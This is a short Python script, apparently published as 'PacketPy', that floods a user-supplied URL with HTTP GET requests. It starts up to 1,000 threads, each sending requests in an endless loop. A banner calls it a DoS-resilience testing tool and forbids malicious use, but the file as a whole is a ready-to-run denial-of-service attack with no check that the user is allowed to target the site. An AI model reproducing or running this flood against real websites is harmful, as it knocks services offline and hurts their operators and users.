# Simple HTTP-GET Flood python script
# Standalone PacketPy script
# https://github.com/fortless
# Base by https://github.com/awaitclone

version = '1.1-01_beta' # Don't touch this

import threading
import requests
import os
import time

def clearterminal():
    if os.name == str("nt"):
        os.system("cls")
    else:
        os.system("clear")
print("--------")
print("ATTENTION")
print("This tool was created to test devices’ abilities to withstand DoS attacks.")
print("Usage of this tool for malicious purposes without permission is prohibited.")
print("")
print("PacketPy " + str(version))
print("--------")
print("")
input("Press ENTER to continue ")
print("")
threads = 20        
url = input("Target URL [https://example.com]: ")
if not url.__contains__("http") or not url.__contains__(".") or not url.__contains__("://"):
    while not url.__contains__("http") or not url.__contains__("."):
        print("Please provide a valid URL.")
        url = input("Target URL [https://example.com]: ")
try:
    threads = int(input("Threads [20] [1-1000]:  "))
except ValueError:
    exit("Error")
if threads == 0:
    exit("Minimum [1]")
def dos(target):
    while True:
        requests.get(url)

clearterminal()
print("-----------------------------------------")
print("")
print(" -=- HTTP payload in progress.. -=-")
print("")
print("")
print("- Target URL: " + str(url)+ " -")
print("- HTTP Payload size: Random")
print("- OS: " + str(os.name) + " -")
print("- PacketPy version: " + str(version) + " -")
print("")
print("PacketPy, an open-source")
print("network tool library, written in")
print("Python.")
print("")
print("Interactive mode (HTTP Flood)")
print("")
print("-----------------------------------------")
for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    try:
        thr.start()
    except KeyboardInterrupt:
        threads = 0
        print("Payload stopped!")
